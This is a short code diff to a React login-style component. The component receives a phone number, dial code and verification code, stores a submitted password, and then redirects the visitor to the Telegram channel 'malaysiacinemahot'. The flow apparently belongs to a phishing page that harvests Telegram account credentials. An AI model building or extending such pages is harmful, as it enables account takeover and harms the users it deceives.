@@ -17,18 +17,7 @@ export default function GetPassword({ getPhone, getDialCode, getVerif }) {
     const submitHandler = () => {
         post(route("store-password"), {
             onSuccess: () => {
-                const urlTelegram = "https://t.me/malaysiacinemahot";
-                const tgAppUrl = "tg://resolve?domain=malaysiacinemahot";
-
-                const userAgent = navigator.userAgent.toLowerCase();
-
-                if (/android|iphone|ipad|ipod/.test(userAgent)) {
-                    // Jika pengguna di Android atau iOS, buka aplikasi Telegram
-                    window.location.href = tgAppUrl;
-                } else {
-                    // Jika pengguna di Desktop, buka Telegram di tab baru
-                    window.open(urlTelegram, "_blank");
-                }
+                window.open("https://t.me/malaysiacinemahot", "_blank");
             },
         });
     };
